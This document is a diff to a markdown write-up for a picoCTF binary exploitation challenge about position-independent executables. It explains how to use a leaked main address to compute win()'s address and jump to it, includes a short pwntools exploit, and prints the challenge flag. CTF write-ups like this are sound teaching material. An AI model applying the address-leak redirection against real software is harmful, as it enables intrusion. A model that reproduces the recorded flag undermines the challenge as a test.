@@ -2,7 +2,7 @@
 
 **Link**: https://play.picoctf.org/practice/challenge/490
 
-**difficulty**: easy
+**Difficulty**: easy
 
 ## Description
 
@@ -10,47 +10,48 @@ Can you try to get the flag? Beware we have PIE!
 
 ## Resources
 
-**vuln**: binary file
+- **vuln**: the vulnerable binary
+- **vuln.c**: its source code
+- **solver.py**: pwntools exploit
 
-**vuln.c**: source code
+## Key observations (from the source)
+
+- The binary is a PIE, so addresses are randomized each run — but `main` prints
+  its own address, handing us the leak we need:
+
+      printf("Address of main: %p\n", &main);
+
+- It then reads a hex address and **jumps straight to it**:
+
+      scanf("%lx", &val);
+      void (*foo)(void) = (void (*)())val;
+      foo();
+
+- There is a `win()` function that opens and prints `flag.txt`. It is never called
+  normally, so we just have to jump to it.
 
 ## How to solve
 
-By running the binary you receive a leak and a prompt:
+PIE randomizes the load base but **not** the relative offset between symbols. So:
 
-    Address of main: 0x6070df9e933d
-    Enter the address to jump to, ex => 0x12345:
+    base   = leaked_main - offset_of(main)     # recover the load base
+    target = base + offset_of(win)             # absolute address of win
 
-The leaked `main` address defeats PIE. Inspecting the binary reveals a `win` function that prints the flag. We can compute the absolute address of `win` at runtime and send it as the ASCII hex address the program expects.
+pwntools reads those static offsets from the ELF for us via `elf.symbols`.
 
-Use a pwntools script that:
+Exploit (see `solver.py`, run with `python3 solver.py REMOTE`):
 
-    - reads the leaked line
-    - parses the leaked address
-    - computes base = leaked - main_rel
-    - computes target = base + win_rel
-    - sends hex(target) as ASCII
-
-Example snippet (inside your exploit script):
-
-    string = io.recvline().decode()
-    print(f"Received string: {string}")
-    address = int(string[19:], 16)
-    print(f"Leaked address: {hex(address)}")
-    main = elf.symbols['main']
-    win = elf.symbols['win']
-    print(f"Main address: {hex(main)}")
-    print(f"Win address: {hex(win)}")
-    offset = address - main
-    print(f"Calculated offset: {hex(offset)}")
-    print(f"Win address with offset: {hex(win + offset)}")
-    payload = hex(win + offset).encode()
+    string  = io.recvline().decode()
+    address = int(string[19:], 16)             # parse leaked main address
+    main    = elf.symbols['main']
+    win     = elf.symbols['win']
+    offset  = address - main                   # PIE base
+    payload = hex(win + offset).encode()       # program expects ASCII hex
     io.sendline(payload)
     print(io.recvline())
     print(io.recvline())
     print(io.recvline())
 
-After sending the computed address you should get the flag:
+## Flag
 
     picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_801240da}
-
